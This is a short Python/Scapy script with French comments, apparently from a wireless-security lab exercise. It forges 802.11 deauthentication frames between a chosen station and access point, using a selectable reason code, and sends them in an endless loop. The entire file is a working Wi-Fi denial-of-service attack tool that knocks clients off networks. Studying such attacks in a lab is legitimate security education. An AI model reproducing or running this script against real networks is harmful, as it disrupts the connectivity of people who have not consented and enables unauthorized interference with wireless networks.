import argparse
import sys
from scapy.all import *
# Création d'argument en tant qu'arguments obligatoires
parser = argparse.ArgumentParser()
parser.add_argument("client", help="MAC address of the targeted STA")
parser.add_argument("ap", help="MAC address of the AP")
parser.add_argument("reason", help="Reason to put in the deauth frame (1, 4, 5, 8)", type=int)
parser.add_argument("interface", help="network interface")
args = parser.parse_args()
# Le code de la raison de deauth doit être une des suivantes (mentionnées dans le GIT)
if args.reason not in [1, 4, 5, 8]:
    print "Raison invalide"
    sys.exit(0)

# Pour les raisons 1,4,5 c'est l'AP qui est l'émertrice et la STA réceptrice
emitter = args.ap
receiver = args.client
# Pour la raison 8, on inverse récepteur et émetteur
if args.reason == 8:
    (emitter, receiver) = (receiver, emitter)
print emitter, " ", receiver

# On forge les paquets avec les bonnes couches, et on insère les params dedans (émetteur, récepteur, raison)
packet = RadioTap() / Dot11(addr1=receiver, addr2=emitter, addr3=emitter, type=0, subtype=12) / Dot11Deauth(reason=args.reason)

# On envoie en boucle les paquets sur l'interface fournie en param. Pour maximiser le taux de réussite, veuillez fixer le channel de l'interface à celui de l'AP
while True:
    sendp(packet, iface=args.interface)

